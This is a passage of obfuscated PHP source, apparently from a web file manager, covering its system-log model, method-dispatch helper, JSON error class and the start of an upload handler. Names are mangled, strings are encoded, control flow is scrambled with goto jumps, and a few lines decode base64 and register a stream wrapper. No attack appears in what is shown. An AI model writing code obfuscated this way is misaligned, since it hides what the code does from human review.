parent::remove($aùÖĞ¼[$_SERVER[Ö¹ñÒÁ²÷][363]]); } public function add($Eš®‡È’Ğ) { if ($this->findByName($Eš®‡È’Ğ[$_SERVER[Ö¹ñÒÁ²÷][28]])) { return !1; } return parent::insert($Eš®‡È’Ğ); } public function update($dÈ±¦²‘°, $E¬ˆöœ‹…µ) { $Fï©­óÊ¯’ =& $_SERVER[Ö¹ñÒÁ²÷]; $bÚ”ÕƒöÖ = $this->findByName($dÈ±¦²‘°); $A¸‡ˆì±…× = $this->findByName($E¬ˆöœ‹…µ[$Fï©­óÊ¯’[28]]); if (!$bÚ”ÕƒöÖ || $A¸‡ˆì±…× && $A¸‡ˆì±…×[$Fï©­óÊ¯’[363]] != $bÚ”ÕƒöÖ[$Fï©­óÊ¯’[363]]) { return !1; } return parent::update($bÚ”ÕƒöÖ[$Fï©­óÊ¯’[363]], $E¬ˆöœ‹…µ); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\163\x74\x65\155\137\154\x6f\147"; protected $dataAuto = array(array("\x63\162\145\141\164\x65\x54\151\x6d\x65", "\x74\x69\x6d\145", "\x69\156\163\145\162\164", "\146\165\156\x63\x74\151\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $B¡¤âª’È =& $_SERVER[Ö¹ñÒÁ²÷]; return array($B¡¤âª’È[2352] => LNG($B¡¤âª’È[2353]), $B¡¤âª’È[2354] => LNG($B¡¤âª’È[2355]), $B¡¤âª’È[2019] => LNG($B¡¤âª’È[2356]), $B¡¤âª’È[2357] => LNG($B¡¤âª’È[2358]), $B¡¤âª’È[2359] => LNG($B¡¤âª’È[2360]), $B¡¤âª’È[2361] => LNG($B¡¤âª’È[2362]), $B¡¤âª’È[2363] => LNG($B¡¤âª’È[2364]), $B¡¤âª’È[2365] => LNG($B¡¤âª’È[2366]), $B¡¤âª’È[2050] => LNG($B¡¤âª’È[2367]), $B¡¤âª’È[2051] => LNG($B¡¤âª’È[2368]), $B¡¤âª’È[2369] => LNG($B¡¤âª’È[2370]), $B¡¤âª’È[2371] => LNG($B¡¤âª’È[2372]), $B¡¤âª’È[2373] => LNG($B¡¤âª’È[2374]), $B¡¤âª’È[2375] => LNG($B¡¤âª’È[2376]), $B¡¤âª’È[2048] => LNG($B¡¤âª’È[2377]), $B¡¤âª’È[2054] => LNG($B¡¤âª’È[2378]), $B¡¤âª’È[2379] => LNG($B¡¤âª’È[2380]), $B¡¤âª’È[2381] => LNG($B¡¤âª’È[2382]), $B¡¤âª’È[2383] => LNG($B¡¤âª’È[2384]), $B¡¤âª’È[2385] => LNG($B¡¤âª’È[2386]), $B¡¤âª’È[2057] => LNG($B¡¤âª’È[2387]), $B¡¤âª’È[2058] => LNG($B¡¤âª’È[2388]), $B¡¤âª’È[2389] => LNG($B¡¤âª’È[2390]), $B¡¤âª’È[2391] => LNG($B¡¤âª’È[2392]), $B¡¤âª’È[2393] => LNG($B¡¤âª’È[2394]), $B¡¤âª’È[2395] => LNG($B¡¤âª’È[2396]), $B¡¤âª’È[2397] => LNG($B¡¤âª’È[2398]), $B¡¤âª’È[2052] => LNG($B¡¤âª’È[2399]), $B¡¤âª’È[2400] => LNG($B¡¤âª’È[2401]), $B¡¤âª’È[2402] => LNG($B¡¤âª’È[2403]), $B¡¤âª’È[2404] => LNG($B¡¤âª’È[2404]), $B¡¤âª’È[2405] => LNG($B¡¤âª’È[2023]), $B¡¤âª’È[2406] => LNG($B¡¤âª’È[2407]), $B¡¤âª’È[2408] => LNG($B¡¤âª’È[2409]), $B¡¤âª’È[2410] => LNG($B¡¤âª’È[2411]), $B¡¤âª’È[2412] => LNG($B¡¤âª’È[2413]), $B¡¤âª’È[2414] => LNG($B¡¤âª’È[2415]), $B¡¤âª’È[2416] => LNG($B¡¤âª’È[2416]), $B¡¤âª’È[2417] => LNG($B¡¤âª’È[2418]), $B¡¤âª’È[2419] => LNG($B¡¤âª’È[2420]), $B¡¤âª’È[2421] => LNG($B¡¤âª’È[2422]), $B¡¤âª’È[2423] => LNG($B¡¤âª’È[2424]), $B¡¤âª’È[2425] => LNG($B¡¤âª’È[2426]), $B¡¤âª’È[2427] => LNG($B¡¤âª’È[2428])); } private function typeFile() { $d¦öÜ§™¹£ =& $_SERVER[Ö¹ñÒÁ²÷]; $d¨“ŞÛ­ŞØ = array($d¦öÜ§™¹£[2054] => array($d¦öÜ§™¹£[2055]), $d¦öÜ§™¹£[2373] => array($d¦öÜ§™¹£[2429]), $d¦öÜ§™¹£[2375] => array($d¦öÜ§™¹£[2430]), $d¦öÜ§™¹£[2048] => array($d¦öÜ§™¹£[2049]), $d¦öÜ§™¹£[2381] => array(), $d¦öÜ§™¹£[2383] => array(), $d¦öÜ§™¹£[2385] => array(), $d¦öÜ§™¹£[2057] => array($d¦öÜ§™¹£[2059]), $d¦öÜ§™¹£[2058] => array($d¦öÜ§™¹£[2059]), $d¦öÜ§™¹£[2389] => array($d¦öÜ§™¹£[2431]), $d¦öÜ§™¹£[2391] => array($d¦öÜ§™¹£[2431]), $d¦öÜ§™¹£[2393] => array($d¦öÜ§™¹£[2432]), $d¦öÜ§™¹£[2379] => array($d¦öÜ§™¹£[2433]), $d¦öÜ§™¹£[2395] => array($d¦öÜ§™¹£[2434]), $d¦öÜ§™¹£[2397] => array($d¦öÜ§™¹£[2435]), $d¦öÜ§™¹£[2052] => array($d¦öÜ§™¹£[2053])); return $d¨“ŞÛ­ŞØ; } private function typeAll() { goto DìÑ¢ˆç¦; Fæ¯ßãöÓ˜: foreach ($FêÇÖî¸Şë as $bÕ¥ñŠã­¦ => $C”Èíõï£Ã) { $d°œ›¨•í“[$C”Èíõï£Ã[0]] = $d°œ›¨•í“[$bÕ¥ñŠã­¦]; } $d°œ›¨•í“[$b×ªòÒÙ°‹[2059]] = LNG($b×ªòÒÙ°‹[2436]); $d°œ›¨•í“[$b×ªòÒÙ°‹[2431]] = LNG($b×ªòÒÙ°‹[2437]); goto CŸŠÇ£±¨½; CŸŠÇ£±¨½: return $d°œ›¨•í“; goto e¾ÊíõË°—; DìÑ¢ˆç¦: $b×ªòÒÙ°‹ =& $_SERVER[Ö¹ñÒÁ²÷]; $d°œ›¨•í“ = $this->typeList; $FêÇÖî¸Şë = array_filter($this->typeFile()); goto Fæ¯ßãöÓ˜; e¾ÊíõË°—: } public function addLog($déŒè·¶¤±, $aàö’‰×ÓÔ = array()) { goto E¹â½÷—Çõ; E¹â½÷—Çõ: $Eßğºè°ˆ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!isset($this->typeList[$déŒè·¶¤±])) { return; } $f×‡ Œôº = USER_ID ? USER_ID : (isset($aàö’‰×ÓÔ[$Eßğºè°ˆ[1415]]) ? $aàö’‰×ÓÔ[$Eßğºè°ˆ[1415]] : 0); goto Eùœ èö¶Ê; f¡”„âÅ³: parent::add($aàö’‰×ÓÔ); goto BóÕ±é±à÷; Eùœ èö¶Ê: $CŒ©•Ğ±—Ğ = get_client_ip(); if (!$aàö’‰×ÓÔ || strlen(json_encode($aàö’‰×ÓÔ)) >= 1024) { $aàö’‰×ÓÔ = array($Eßğºè°ˆ[2438] => $CŒ©•Ğ±—Ğ); } else { if (is_array($aàö’‰×ÓÔ)) { $aàö’‰×ÓÔ[$Eßğºè°ˆ[2438]] = $CŒ©•Ğ±—Ğ; } else { $aàö’‰×ÓÔ = array($Eßğºè°ˆ[1028] => $aàö’‰×ÓÔ, $Eßğºè°ˆ[2438] => $CŒ©•Ğ±—Ğ); } } $aàö’‰×ÓÔ = array($Eßğºè°ˆ[1405] => Session::sign(), $Eßğºè°ˆ[1406] => $f×‡ Œôº, $Eßğºè°ˆ[29] => $déŒè·¶¤±, $Eßğºè°ˆ[1408] => json_encode($aàö’‰×ÓÔ)); goto f¡”„âÅ³; BóÕ±é±à÷: } public function remove($CøšÙ¿Î) { $this->where(array($_SERVER[Ö¹ñÒÁ²÷][381] => $CøšÙ¿Î))->delete(); } private function _makeOrder($Dñ¬àöÚô = '') { goto a¥ËÌÚ“ä—; F˜¿é¬•í: return $this->order($Dñ¬àöÚô); goto e¾ğÏ˜ø«Œ; a¥ËÌÚ“ä—: $dæÅó§¥óí =& $_SERVER[Ö¹ñÒÁ²÷]; $B³ÏŒõçĞİ = $dæÅó§¥óí[183]; $BäÀÓÛ¶ˆ­ = array($dæÅó§¥óí[398] => $dæÅó§¥óí[399], $dæÅó§¥óí[400] => $dæÅó§¥óí[401]); goto bî‹ÂÄ˜Úµ; bî‹ÂÄ˜Úµ: $fÌ­¸Ò¸Ÿ = Input::get($dæÅó§¥óí[404], $dæÅó§¥óí[7], $dæÅó§¥óí[2218], array($dæÅó§¥óí[2155], $dæÅó§¥óí[400])); $fÌ­¸Ò¸Ÿ = $BäÀÓÛ¶ˆ­[$fÌ­¸Ò¸Ÿ]; $Dñ¬àöÚô = $Dñ¬àöÚô . "{$B³ÏŒõçĞİ}\x20{$fÌ­¸Ò¸Ÿ}"; goto F˜¿é¬•í; e¾ğÏ˜ø«Œ: } public function get($FñĞÑ”î¿ = '') { goto c²‚º°æ¨; DˆÏŠ†ÇŠ: if ($FñĞÑ”î¿[$BÔöŒåÌ¢[1415]]) { $eßôÎ½¦[$BÔöŒåÌ¢[1415]] = $FñĞÑ”î¿[$BÔöŒåÌ¢[1415]]; } if (isset($FñĞÑ”î¿[$BÔöŒåÌ¢[699]])) { $C†¾Ê±òÅë = $FñĞÑ”î¿[$BÔöŒåÌ¢[699]]; $aêßâ£Íó = isset($FñĞÑ”î¿[$BÔöŒåÌ¢[700]]) ? $FñĞÑ”î¿[$BÔöŒåÌ¢[700]] : time(); $eßôÎ½¦[$BÔöŒåÌ¢[183]] = array($BÔöŒåÌ¢[317], array($C†¾Ê±òÅë, $aêßâ£Íó)); } if ($FñĞÑ”î¿[$BÔöŒåÌ¢[29]]) { $bÈä˜ìÂ‘† = explode($BÔöŒåÌ¢[47], $FñĞÑ”î¿[$BÔöŒåÌ¢[29]]); $b¤­ÔĞ‚ƒŠ = $this->typeFile(); $aÓÑ±÷”í = array(); foreach ($bÈä˜ìÂ‘† as $dø­ƒ’ƒï¸) { $aÓÑ±÷”í[] = $dø­ƒ’ƒï¸; if (isset($b¤­ÔĞ‚ƒŠ[$dø­ƒ’ƒï¸])) { $aÓÑ±÷”í = array_merge($aÓÑ±÷”í, $b¤­ÔĞ‚ƒŠ[$dø­ƒ’ƒï¸]); } } $aÓÑ±÷”í = array_unique($aÓÑ±÷”í); if ($aÓÑ±÷”í) { $eßôÎ½¦[$BÔöŒåÌ¢[29]] = array($BÔöŒåÌ¢[7], $aÓÑ±÷”í); } } goto c‡•Âï“Çî; c‡•Âï“Çî: if (!empty($FñĞÑ”î¿[$BÔöŒåÌ¢[2438]])) { $eßôÎ½¦[$BÔöŒåÌ¢[401]] = array($BÔöŒåÌ¢[748], "\x25{$FñĞÑ”î¿[$BÔöŒåÌ¢[2438]]}\45"); } $E³š˜ÆÅ± = $this->_makeOrder()->where($eßôÎ½¦)->selectPage(); if (empty($E³š˜ÆÅ±[$BÔöŒåÌ¢[350]])) { show_json(array(), !0, $E³š˜ÆÅ±[$BÔöŒåÌ¢[347]]); } goto e²‰÷± À; c²‚º°æ¨: $BÔöŒåÌ¢ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$FñĞÑ”î¿) { show_json(array()); } $eßôÎ½¦ = array(); goto DˆÏŠ†ÇŠ; e²‰÷± À: $E³š˜ÆÅ±[$BÔöŒåÌ¢[350]] = $this->logList($E³š˜ÆÅ±[$BÔöŒåÌ¢[350]]); return $E³š˜ÆÅ±; goto fİ™‘å‹“Ë; fİ™‘å‹“Ë: } private function ipAddress(&$f—¯£‰Ï) { $C›åô“˜è‘ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!empty($f—¯£‰Ï[$C›åô“˜è‘[2438]])) { $CÌ÷áÖ„¾· = IpLocation::get($f—¯£‰Ï[$C›åô“˜è‘[2438]]); if ($CÌ÷áÖ„¾· == $C›åô“˜è‘[2439]) { $CÌ÷áÖ„¾· = $C›åô“˜è‘[2440]; } } else { $CÌ÷áÖ„¾· = LNG($C›åô“˜è‘[2441]); } $f—¯£‰Ï[$C›åô“˜è‘[2442]] = $CÌ÷áÖ„¾·; } private function descZipDownload($F‡¸†•ğ£‡, &$E”ƒØ•Üá†) { $D‘½”³‚ÎÎ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!isset($F‡¸†•ğ£‡[$D‘½”³‚ÎÎ[2443]])) { return; } $eî±ºˆÚãß = json_decode($F‡¸†•ğ£‡[$D‘½”³‚ÎÎ[2443]], !0); foreach ($eî±ºˆÚãß as $fâñ²µÃë) { if (!IO::init($fâñ²µÃë[$D‘½”³‚ÎÎ[75]])) { continue; } if (!($bŠ‹£àôß = IO::infoFull($fâñ²µÃë[$D‘½”³‚ÎÎ[75]]))) { continue; } $F‡¸†•ğ£‡[$D‘½”³‚ÎÎ[75]] = $fâñ²µÃë[$D‘½”³‚ÎÎ[75]]; $E”ƒØ•Üá†[] = $F‡¸†•ğ£‡[$D‘½”³‚ÎÎ[365]] = $bŠ‹£àôß[$D‘½”³‚ÎÎ[365]]; $E”ƒØ•Üá†[] = $F‡¸†•ğ£‡[$D‘½”³‚ÎÎ[2259]] = $bŠ‹£àôß[$D‘½”³‚ÎÎ[457]]; break; } return $F‡¸†•ğ£‡; } private function getSourceList(&$D–ùçƒ˜Ì¢) { $eóÛÅ†–ä¤ =& $_SERVER[Ö¹ñÒÁ²÷]; $f‚Í’ëÄŞÂ = array(); foreach ($D–ùçƒ˜Ì¢ as $A§èêÎéÖº => $bà‹»ÏÓÆ) { goto dŸ¶Ã––¥«; fº·¡óù„á: $f‚Í’ëÄŞÂ[] = $Aœ…ßš¦Á[$eóÛÅ†–ä¤[365]]; $f‚Í’ëÄŞÂ[] = $Aœ…ßš¦Á[$eóÛÅ†–ä¤[2259]]; if ($Aœ…ßš¦Á[$eóÛÅ†–ä¤[29]] == $eóÛÅ†–ä¤[488]) { $f‚Í’ëÄŞÂ[] = $Aœ…ßš¦Á[$eóÛÅ†–ä¤[401]][$eóÛÅ†–ä¤[1000]]; $f‚Í’ëÄŞÂ[] = $Aœ…ßš¦Á[$eóÛÅ†–ä¤[401]][$eóÛÅ†–ä¤[1001]]; } goto C±ŒÆŒ‹Ùç; dŸ¶Ã––¥«: $Aœ…ßš¦Á = json_decode($bà‹»ÏÓÆ[$eóÛÅ†–ä¤[401]], !0); if ($bà‹»ÏÓÆ[$eóÛÅ†–ä¤[29]] == $eóÛÅ†–ä¤[2051]) { $Aœ…ßš¦Á = $this->descZipDownload($Aœ…ßš¦Á, $f‚Í’ëÄŞÂ); $D–ùçƒ˜Ì¢[$A§èêÎéÖº][$eóÛÅ†–ä¤[401]] = json_encode($Aœ…ßš¦Á); continue; } if (strpos($bà‹»ÏÓÆ[$eóÛÅ†–ä¤[29]], $eóÛÅ†–ä¤[2260]) !== 0) { goto CÎ»Ì‹º”Ø; Aà¥æÑä: $f‚Í’ëÄŞÂ[] = $Aœ…ßš¦Á[$eóÛÅ†–ä¤[365]] = $Bù×šÓ‹Œ“[$eóÛÅ†–ä¤[365]]; $f‚Í’ëÄŞÂ[] = $Aœ…ßš¦Á[$eóÛÅ†–ä¤[2259]] = $Bù×šÓ‹Œ“[$eóÛÅ†–ä¤[457]]; $D–ùçƒ˜Ì¢[$A§èêÎéÖº][$eóÛÅ†–ä¤[401]] = json_encode($Aœ…ßš¦Á); goto CÛ‡â­Õõ‚; CÎ»Ì‹º”Ø: if (!isset($Aœ…ßš¦Á[$eóÛÅ†–ä¤[75]]) || strpos($bà‹»ÏÓÆ[$eóÛÅ†–ä¤[29]], $eóÛÅ†–ä¤[2444]) !== 0) { continue; } if (!IO::init($Aœ…ßš¦Á[$eóÛÅ†–ä¤[75]])) { continue; } if (!($Bù×šÓ‹Œ“ = IO::infoFull($Aœ…ßš¦Á[$eóÛÅ†–ä¤[75]]))) { continue; } goto Aà¥æÑä; CÛ‡â­Õõ‚: continue; goto fÓ†œ­ºà; fÓ†œ­ºà: } goto fº·¡óù„á; C±ŒÆŒ‹Ùç: if ($Aœ…ßš¦Á[$eóÛÅ†–ä¤[29]] == $eóÛÅ†–ä¤[2267]) { $f‚Í’ëÄŞÂ[] = $Aœ…ßš¦Á[$eóÛÅ†–ä¤[401]][$eóÛÅ†–ä¤[365]]; } goto CáóÇ„Ã˜Ş; CáóÇ„Ã˜Ş: } if (!$f‚Í’ëÄŞÂ) { return array(); } return Model($eóÛÅ†–ä¤[749])->sourceListInfo($f‚Í’ëÄŞÂ, !0); } private function logList($B†·÷á‡±) { goto E…íŸŠ¢è; c÷æÏßâç¼: $AŞáœ‚æç = array(); foreach ($B†·÷á‡± as $Bµ…©‡ä¿× => $F˜Ô”¹„) { goto d¤Èè»„Œ; A‚áÏ±â£: unset($F˜Ô”¹„[$aí§…³õá[2447]]); $eø¯Ñ»Œ¬ï[] = $F˜Ô”¹„; goto C°˜ÛÈŞ¥; c¿¬°¶º½ñ: $this->ipAddress($F˜Ô”¹„); if (strpos($F±õ…ã”²â, $aí§…³õá[2260]) === 0 || isset($e„¸ƒ—‰¾‘[$aí§…³õá[2259]])) { goto D¶ùô…ğêÀ; Bè™ñ´™Á¯: if ($e„¸ƒ—‰¾‘[$aí§…³õá[29]] == $aí§…³õá[2267]) { $e„¸ƒ—‰¾‘[$aí§…³õá[401]][$aí§…³õá[365]] = $c°ÛÜ¶œßÜ[$e„¸ƒ—‰¾‘[$aí§…³õá[401]][$aí§…³õá[365]]]; } if ($e„¸ƒ—‰¾‘[$aí§…³õá[29]] == $aí§…³õá[2046]) { $e„¸ƒ—‰¾‘[$aí§…³õá[2272]] = $e„¸ƒ—‰¾‘[$aí§…³õá[387]]; $e„¸ƒ—‰¾‘[$aí§…³õá[2259]] = $e„¸ƒ—‰¾‘[$aí§…³õá[2272]][$aí§…³õá[365]]; $e„¸ƒ—‰¾‘[$aí§…³õá[387]] = !1; $e„¸ƒ—‰¾‘[$aí§…³õá[365]] = $aí§…³õá[33]; } if ($e„¸ƒ—‰¾‘[$aí§…³õá[387]] && $e„¸ƒ—‰¾‘[$aí§…³õá[387]][$aí§…³õá[367]] == $aí§…³õá[1074]) { $AŞáœ‚æç[] = $F˜Ô”¹„[$aí§…³õá[363]]; unset($B†·÷á‡±[$Bµ…©‡ä¿×]); continue; } goto B±Ş¨ï£; B±Ş¨ï£: if ($e„¸ƒ—‰¾‘[$aí§…³õá[2272]] && $e„¸ƒ—‰¾‘[$aí§…³õá[2272]][$aí§…³õá[367]] == $aí§…³õá[1074]) { $AŞáœ‚æç[] = $F˜Ô”¹„[$aí§…³õá[363]]; unset($B†·÷á‡±[$Bµ…©‡ä¿×]); continue; } goto e·ó„çÉªÕ; D¶ùô…ğêÀ: $e„¸ƒ—‰¾‘[$aí§…³õá[387]] = $c°ÛÜ¶œßÜ[$e„¸ƒ—‰¾‘[$aí§…³õá[365]]]; $e„¸ƒ—‰¾‘[$aí§…³õá[2272]] = $c°ÛÜ¶œßÜ[$e„¸ƒ—‰¾‘[$aí§…³õá[2259]]]; if ($e„¸ƒ—‰¾‘[$aí§…³õá[29]] == $aí§…³õá[488]) { $e„¸ƒ—‰¾‘[$aí§…³õá[401]][$aí§…³õá[1000]] = $c°ÛÜ¶œßÜ[$e„¸ƒ—‰¾‘[$aí§…³õá[401]][$aí§…³õá[1000]]]; $e„¸ƒ—‰¾‘[$aí§…³õá[401]][$aí§…³õá[1001]] = $c°ÛÜ¶œßÜ[$e„¸ƒ—‰¾‘[$aí§…³õá[401]][$aí§…³õá[1001]]]; } goto Bè™ñ´™Á¯; e·ó„çÉªÕ: } $F˜Ô”¹„[$aí§…³õá[401]] = $e„¸ƒ—‰¾‘; goto A‚áÏ±â£; bŠƒÜ×»ÜÙ: $F˜Ô”¹„[$aí§…³õá[2217]] = $C²¸ŒÇŠ‡ø; $e„¸ƒ—‰¾‘ = json_decode($F˜Ô”¹„[$aí§…³õá[401]], !0); $F˜Ô”¹„[$aí§…³õá[2438]] = isset($e„¸ƒ—‰¾‘[$aí§…³õá[2438]]) ? $e„¸ƒ—‰¾‘[$aí§…³õá[2438]] : $aí§…³õá[33]; goto c¿¬°¶º½ñ; d¤Èè»„Œ: $F±õ…ã”²â = $F˜Ô”¹„[$aí§…³õá[29]]; $C²¸ŒÇŠ‡ø = isset($cªÌ÷¡Õ[$F˜Ô”¹„[$aí§…³õá[1415]]]) ? $cªÌ÷¡Õ[$F˜Ô”¹„[$aí§…³õá[1415]]] : !1; $Eˆ‡ÌŒƒîõ = strpos($F±õ…ã”²â, $aí§…³õá[2445]) === 0 ? LNG($aí§…³õá[2446]) : LNG($aí§…³õá[2441]); goto aµª‚Î¬°Ò; aµª‚Î¬°Ò: $F˜Ô”¹„[$aí§…³õá[28]] = isset($C²¸ŒÇŠ‡ø[$aí§…³õá[28]]) ? $C²¸ŒÇŠ‡ø[$aí§…³õá[28]] : LNG($aí§…³õá[2441]); $F˜Ô”¹„[$aí§…³õá[2307]] = isset($C²¸ŒÇŠ‡ø[$aí§…³õá[2307]]) ? $C²¸ŒÇŠ‡ø[$aí§…³õá[2307]] : $aí§…³õá[33]; $F˜Ô”¹„[$aí§…³õá[1323]] = isset($e±æ‚æ˜Œ[$F±õ…ã”²â]) ? $e±æ‚æ˜Œ[$F±õ…ã”²â] : $Eˆ‡ÌŒƒîõ; goto bŠƒÜ×»ÜÙ; C°˜ÛÈŞ¥: } $this->clearSystemPathLog($AŞáœ‚æç); goto d·İï’¢»§; d·İï’¢»§: return $eø¯Ñ»Œ¬ï; goto F–ºÓÆòĞÂ; fĞÛà “Ü: $c°ÛÜ¶œßÜ = $this->getSourceList($B†·÷á‡±); $e±æ‚æ˜Œ = $this->typeAll(); $eø¯Ñ»Œ¬ï = array(); goto c÷æÏßâç¼; E…íŸŠ¢è: $aí§…³õá =& $_SERVER[Ö¹ñÒÁ²÷]; $c÷•ÉŸÑ”Œ = array_to_keyvalue($B†·÷á‡±, $aí§…³õá[33], $aí§…³õá[1415]); $cªÌ÷¡Õ = Model($aí§…³õá[473])->userListInfo(array_unique($c÷•ÉŸÑ”Œ)); goto fĞÛà “Ü; F–ºÓÆòĞÂ: } private function clearSystemPathLog($F¸ëÍÆÕë) { $f÷Â’¼ó =& $_SERVER[Ö¹ñÒÁ²÷]; if (count($F¸ëÍÆÕë) == 0) { return; } $DßŞêÉ¦ìŸ = array($f÷Â’¼ó[363] => array($f÷Â’¼ó[7], array_unique($F¸ëÍÆÕë))); $this->where($DßŞêÉ¦ìŸ)->delete(); } public function deviceList($D¥Öä¥¥á¡, $BÖê‘Î¯çÖ = 0) { $b‡‚Ì‹½¼ =& $_SERVER[Ö¹ñÒÁ²÷]; $A‚†ğ÷Ã¼Ì = array($b‡‚Ì‹½¼[1415] => $D¥Öä¥¥á¡, $b‡‚Ì‹½¼[183] => array($b‡‚Ì‹½¼[924], $BÖê‘Î¯çÖ), $b‡‚Ì‹½¼[29] => $b‡‚Ì‹½¼[2019]); $F†²µ‡¸¼Ê = array(); $b´–˜â ƒ = $this->field($b‡‚Ì‹½¼[2448])->where($A‚†ğ÷Ã¼Ì)->order($b‡‚Ì‹½¼[2270])->limit(50)->select(); foreach ($b´–˜â ƒ as $F„Ÿƒ£±´ß => $cµæ‹‘„Æ) { goto Bö”–Ïí¹; f¢Ê½Ö­Ì´: unset($e•ÙÅ¢¬°Œ[$b‡‚Ì‹½¼[2438]]); $FâÉğ“·›ñ = $this->deviceType($e•ÙÅ¢¬°Œ[$b‡‚Ì‹½¼[2261]]); if (isset($F†²µ‡¸¼Ê[$FâÉğ“·›ñ])) { continue; } goto A‚•ª¿Ü½; Bö”–Ïí¹: if ($F„Ÿƒ£±´ß > 0 && abs($cµæ‹‘„Æ[$b‡‚Ì‹½¼[183]] - $b´–˜â ƒ[$F„Ÿƒ£±´ß - 1][$b‡‚Ì‹½¼[183]]) < 5) { continue; } $e•ÙÅ¢¬°Œ = json_decode($cµæ‹‘„Æ[$b‡‚Ì‹½¼[401]], !0); $cµæ‹‘„Æ[$b‡‚Ì‹½¼[2438]] = isset($e•ÙÅ¢¬°Œ[$b‡‚Ì‹½¼[2438]]) ? $e•ÙÅ¢¬°Œ[$b‡‚Ì‹½¼[2438]] : $b‡‚Ì‹½¼[33]; goto f¢Ê½Ö­Ì´; A‚•ª¿Ü½: $this->ipAddress($cµæ‹‘„Æ); $cµæ‹‘„Æ[$b‡‚Ì‹½¼[401]] = $e•ÙÅ¢¬°Œ; $F†²µ‡¸¼Ê[$FâÉğ“·›ñ] = $cµæ‹‘„Æ; goto FœÊƒáøÛ•; FœÊƒáøÛ•: } return array_values($F†²µ‡¸¼Ê); } public function deviceType($FÂïÑ÷•·æ) { return $FÂïÑ÷•·æ; } } goto cæëÊĞÙÑ¹; d…²–¬‡Ä»: function beforeShutdown() { Hook::trigger($_SERVER[¡Äç²][36]); } $_SERVER[$_SERVER[¡Äç²][37]] = BASIC_PATH; $_SERVER[$_SERVER[¡Äç²][38]] = LIB_DIR; goto Dß»ùğâÅæ; BÖâ¨Ÿã”ƒ: $_SERVER[$_SERVER[¡Äç²][52]] = ("\x39\x35\x33\x36".base64_decode('ODA='))+0;$_GwJR="iXk4Xavcyen39dGGUYDW4zASQ8nqHbKWmcwUmpA5BXI4YMuRyCbDQz67HE3eguYK3";; stream_wrapper_register($_SERVER[¡Äç²][53], $_SERVER[¡Äç²][54]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($cĞëŒŠÁí, $CöÏÁºã•¼) { $AÕ ¹ç­ò¼ =& $_SERVER[Ö¹ñÒÁ²÷]; if (isset(self::$_methodList[$cĞëŒŠÁí])) { return @call_user_func_array(self::$_methodList[$cĞëŒŠÁí], $CöÏÁºã•¼); } else { if (method_exists($this, $cĞëŒŠÁí)) { return call_user_func_array(array($this, $cĞëŒŠÁí), $CöÏÁºã•¼); } else { think_exception(__CLASS__ . $AÕ ¹ç­ò¼[4] . $cĞëŒŠÁí . $AÕ ¹ç­ò¼[5]); } } } public static function __callStatic($DîºŞœ‰ó, $b‰£‚«—Åö) { if (isset(self::$_methodListStatic[$DîºŞœ‰ó])) { return call_user_func_array(self::$_methodListStatic[$DîºŞœ‰ó], $b‰£‚«—Åö); } else { if (method_exists(self, $DîºŞœ‰ó)) { return call_user_func_array(array(self, $DîºŞœ‰ó), $b‰£‚«—Åö); } else { show_json("{$DîºŞœ‰ó}\50\x29\40\x6e\157\x74\40\145\170\151\163\164\73", !1); } } } public static function addMethod($Aºß²‡È¶Ö, $a¨ß«ñš…) { self::$_methodList[$Aºß²‡È¶Ö] = $a¨ß«ñš…; } public static function addMethodStatic($F®À¼—Ÿ¸ñ, $Dª¾Å¢·â©) { self::$_methodListStatic[$F®À¼—Ÿ¸ñ] = $Dª¾Å¢·â©; } } goto C±÷İĞÎçŒ; b·©ë˜»—É: if (class_exists($_SERVER[Ö¹ñÒÁ²÷][1941])) { class Services_JSON_Error extends PEAR_Error { function __construct($a­øïàõ‘Ì = "\165\156\153\x6e\157\167\x6e\x20\x65\162\x72\x6f\x72", $D£·¾ÜöÓ = null, $CÁ…¥¾ÄÌˆ = null, $DœĞ‡¾¿ÌÎ = null, $BŠËî„²¿­ = null) { parent::PEAR_Error($a­øïàõ‘Ì, $D£·¾ÜöÓ, $CÁ…¥¾ÄÌˆ, $DœĞ‡¾¿ÌÎ, $BŠËî„²¿­); } } } else { class Services_JSON_Error { function __construct($Bî¿¢è„öŠ = "\165\x6e\x6b\156\x6f\x77\x6e\x20\x65\x72\162\157\x72", $F±é©µåÒ = null, $C±–ö¹áã = null, $f­äÔ®¶Ùâ = null, $eÑ÷˜¨½ŸŞ = null) { } } } class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto CÕ¢´±°ç; CŞ…¦öˆ°¯: if (!empty($_FILES)) { $dÍ¶åÄ‹Ã = $_FILES[$b÷èÖñ½ä‡[163]]; $this->uploadFile = $dÍ¶åÄ‹Ã[$b÷èÖñ½ä‡[1942]]; if (!$this->uploadFile && $dÍ¶åÄ‹Ã[$b÷èÖñ½ä‡[1205]] > 0) { show_json($this->errorInfo($dÍ¶åÄ‹Ã[$b÷èÖñ½ä‡[1205]]), !1); } } else { if (isset($in[$b÷èÖñ½ä‡[382]])) { $this->uploadFile = isset($in[$b÷èÖñ½ä‡[1943]]) ? $b÷èÖñ½ä‡[1944] : $b÷èÖñ½ä‡[1789]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto Cé¶ˆ·¡¹õ; Cé¶ˆ·¡¹õ: $this->checkSize(); $this->tempPathInit(); goto f†¼ä“®²; CÕ¢´±°ç: $b÷èÖñ½ä‡ =& $_SERVER[Ö¹ñÒÁ²÷]; global $in; $this->in =& $in; goto CŞ…¦öˆ°¯; f†¼ä“®²: } public function upload() { goto CÍÃåÛ§¬; A›²îè•”²: CacheLock::unlock($this->tempFile); return $this->tempFile; goto cØğŠ„œâç; fà¯æ¾î¶: $BÌÒÓ¤à»À = $F…¤¿õò· * $B°±ôˆ¶ŒÖ; $C•è»¯”è = @fopen($this->tempFile, $bòÎé‡§¯‰[1952]); fseek($C•è»¯”è, $BÌÒÓ¤à»À); goto dÏïÏğìó; CÍÃåÛ§¬: $bòÎé‡§¯‰ =& $_SERVER[Ö¹ñÒÁ²÷]; $F…¤¿õò· = isset($this->in[$bòÎé‡§¯‰[1945]]) ? intval($this->in[$bòÎé‡§¯‰[1945]]) : 0; $f‹¦“å›Ç¤ = isset($this->in[$bòÎé‡§¯‰[1946]]) ? 